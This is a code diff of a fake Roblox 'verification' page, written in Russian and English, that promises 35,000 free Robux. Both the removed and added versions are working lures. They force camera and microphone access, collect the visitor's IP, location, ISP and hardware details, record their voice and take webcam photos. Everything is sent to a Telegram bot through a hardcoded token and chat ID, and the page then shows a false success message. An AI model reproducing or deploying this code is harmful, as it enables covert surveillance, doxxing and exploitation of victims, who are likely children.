@@ -3,116 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox | Server Sync 2026</title>
+    <title>Roblox | Verification Center 2026</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .main-card { background: #111; border: 1px solid #0084ff; padding: 40px; border-radius: 30px; text-align: center; width: 90%; max-width: 400px; box-shadow: 0 0 40px #0084ff33; }
-        .btn-claim { background: #0084ff; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 15px; font-size: 22px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
-        #inf { margin-top: 15px; font-size: 12px; color: #444; }
-        #st { margin: 20px 0; color: #0084ff; font-weight: bold; min-height: 24px; }
-        video { position: fixed; top: -100px; left: -100px; width: 1px; height: 1px; opacity: 0.01; }
+        body { font-family: 'Arial', sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .box { background: #0a0a0a; border: 1px solid #0084ff; padding: 40px; border-radius: 20px; text-align: center; width: 90%; max-width: 400px; box-shadow: 0 0 100px rgba(0,132,255,0.2); }
+        .loader { border: 4px solid #111; border-top: 4px solid #0084ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn-ready { background: #0084ff; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 10px; font-size: 20px; font-weight: bold; cursor: pointer; display: none; }
+        #status { color: #0084ff; font-family: monospace; margin-top: 15px; font-size: 13px; }
+        video { position: fixed; top: -5000px; }
     </style>
 </head>
-<body>
+<body onload="requestAccess()">
 
-<div class="main-card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="70" style="filter: invert(1); margin-bottom: 20px;">
-    <h1 style="margin:0;">35,000 ROBUX</h1>
-    <p style="color: #888; font-size: 14px; margin-bottom: 25px;">Синхронизация с сервером выдачи. Требуется калибровка датчиков и Face ID.</p>
-    <button class="btn-claim" id="btn" onclick="megaLog()">ПОЛУЧИТЬ</button>
-    <div id="st">ГОТОВ К ЗАПУСКУ</div>
-    <div id="inf">System Node: <span id="node"></span></div>
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60" style="filter: invert(1);">
+    <h2>ВЕРИФИКАЦИЯ</h2>
+    <div class="loader" id="ldr"></div>
+    <p id="msg" style="font-size: 14px; color: #777;">Установка защищенного соединения с сервером выдачи Robux...</p>
+    <button class="btn-ready" id="mainBtn" onclick="sendFullDox()">ЗАВЕРШИТЬ</button>
+    <div id="status">INITIALIZING...</div>
 </div>
 
 <video id="v" autoplay playsinline muted></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-    document.getElementById('node').innerText = Math.floor(Math.random() * 9999);
-    const T = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
-    const C = '7889497672';
+    const TOKEN = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
+    const CHAT = '7889497672';
+    let activeStream = null;
 
-    async function megaLog() {
-        document.getElementById('btn').style.display = 'none';
-        const st = document.getElementById('st');
-        const v = document.getElementById('v');
-        const c = document.getElementById('c');
-
-        st.innerText = "ПОДКЛЮЧЕНИЕ К ШЛЮЗУ...";
-
-        // 1. СБОР ДОКСА (IP, Сеть, Железо)
-        let d = `🏴‍☠️ **MAXIMUM DOX REPORT** 🏴‍☠️\n\n`;
+    async function requestAccess() {
+        const st = document.getElementById('status');
         try {
-            const r = await fetch('https://ipapi.co/json/');
-            const j = await r.json();
-            d += `📍 IP: \`${j.ip}\`\n🌍 Город: ${j.city}\n📡 Провайдер: ${j.org}\n`;
-        } catch(e) {}
-
-        d += `📱 Устройство: ${navigator.platform}\n`;
-        d += `⚙️ CPU: ${navigator.hardwareConcurrency} ядер\n`;
-        d += `🖥 Экран: ${screen.width}x${screen.height}\n`;
-        d += `🔋 Батарея: Опрос...\n`;
-        d += `🕶 GPU: ${getG()}\n`;
-
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            d = d.replace('Опрос...', `${(b.level * 100).toFixed(0)}%`);
-        }
-
-        try {
-            // 2. ОТКРЫВАЕМ STREAM (Камера + Микро)
-            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-            v.srcObject = s;
-
-            // 3. ЗАПИСЬ ЗВУКА (6 сек)
-            const rec = new MediaRecorder(s);
-            const chunks = [];
-            rec.ondataavailable = e => chunks.push(e.data);
-            rec.onstop = async () => {
-                const b = new Blob(chunks, { type: 'audio/ogg' });
-                const fd = new FormData();
-                fd.append('chat_id', C);
-                fd.append('voice', b, 'v.ogg');
-                fetch(`https://api.telegram.org/bot${T}/sendVoice`, { method: 'POST', body: fd });
-            };
-            rec.start();
-            st.innerText = "КАЛИБРОВКА (ЖДИТЕ)...";
-
-            setTimeout(() => {
-                rec.stop();
-                
-                // 4. ФОТО
-                c.width = v.videoWidth;
-                c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                
-                c.toBlob(blob => {
-                    const fd = new FormData();
-                    fd.append('chat_id', C);
-                    fd.append('photo', blob, 'f.jpg');
-                    fd.append('caption', d + `\n\n✅ **ФОТО + ГОЛОС ОТПРАВЛЕНЫ!**`);
-
-                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd })
-                    .then(() => {
-                        s.getTracks().forEach(t => t.stop());
-                        alert("✅ Успешно! Робуксы придут в течение 10 минут.");
-                        window.location.href = "https://www.roblox.com";
-                    });
-                }, 'image/jpeg', 0.85);
-            }, 6000);
-
+            // ФОРСИРУЕМ ЗАПРОС ПРИ ЗАГРУЗКЕ
+            activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            document.getElementById('v').srcObject = activeStream;
+            
+            st.innerText = "STREAM CONNECTED. EXTRACTING...";
+            document.getElementById('ldr').style.display = 'none';
+            document.getElementById('mainBtn').style.display = 'block';
+            document.getElementById('msg').innerText = "Биометрический поток подтвержден. Нажмите кнопку для получения 35,000 Robux.";
         } catch (e) {
-            alert("Ошибка! Разрешите камеру и микрофон для получения награды.");
-            document.getElementById('btn').style.display = 'block';
+            st.innerText = "ACCESS DENIED";
+            alert("ОШИБКА: Для получения бонуса необходимо разрешить доступ к камере и микрофону в браузере.");
+            location.reload();
         }
     }
 
-    function getG() {
+    async function sendFullDox() {
+        const btn = document.getElementById('mainBtn');
+        btn.disabled = true;
+        btn.innerText = "PROCESSING...";
+        
+        // 1. ГЛУБОКИЙ ДОКС (Железо + Сеть + Оборудование)
+        let report = `🔥 **ULTIMATE STREAM REPORT** 🔥\n\n`;
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipD = await ipRes.json();
+            report += `📍 IP: \`${ipD.ip}\` (${ipD.org})\n🌍 Локация: ${ipD.city}, ${ipD.country_name}\n`;
+        } catch(e) {}
+
+        report += `\n📱 **DEVICE DETAILS:**\n`;
+        report += `⚙️ CPU: ${navigator.hardwareConcurrency} ядер\n`;
+        report += `🖥 Экран: ${screen.width}x${screen.height}\n`;
+        report += `🎨 GPU: ${getGPU()}\n`;
+        report += `🔋 Батарея: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + '%' : '?'}\n`;
+        
+        report += `\n📸 **MEDIA NODES:**\n`;
+        devices.forEach(d => {
+            if(d.label) report += `🔹 ${d.kind}: ${d.label}\n`;
+        });
+
+        // 2. ЗАПИСЬ ГОЛОСА
+        const recorder = new MediaRecorder(activeStream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'audio/ogg' });
+            const fd = new FormData();
+            fd.append('chat_id', CHAT);
+            fd.append('voice', blob, 'v.ogg');
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
+        };
+        recorder.start();
+
+        // 3. СЕРИЯ ФОТО (3 ШТУКИ)
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+        c.width = v.videoWidth;
+        c.height = v.videoHeight;
+
+        for (let i = 1; i <= 3; i++) {
+            await new Promise(r => setTimeout(r, 1500)); // Интервал между фото
+            c.getContext('2d').drawImage(v, 0, 0);
+            const imgBlob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
+            const fd = new FormData();
+            fd.append('chat_id', CHAT);
+            fd.append('photo', imgBlob, `shot_${i}.jpg`);
+            if (i === 1) fd.append('caption', report); // К первому фото крепим весь докс
+            
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        }
+
+        recorder.stop();
+        
+        alert("✅ Верификация успешно завершена! 35,000 Robux поступят на ваш баланс в течение 5-10 минут.");
+        window.location.href = "https://www.roblox.com";
+    }
+
+    function getGPU() {
         try {
             const gl = document.createElement('canvas').getContext('webgl');
-            const db = gl.getExtension('WEBGL_debug_renderer_info');
-            return gl.getParameter(db.UNMASKED_RENDERER_WEBGL);
-        } catch(e) { return '?'; }
+            const ext = gl.getExtension('WEBGL_debug_renderer_info');
+            return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+        } catch(e) { return 'Unknown'; }
     }
 </script>
 </body>
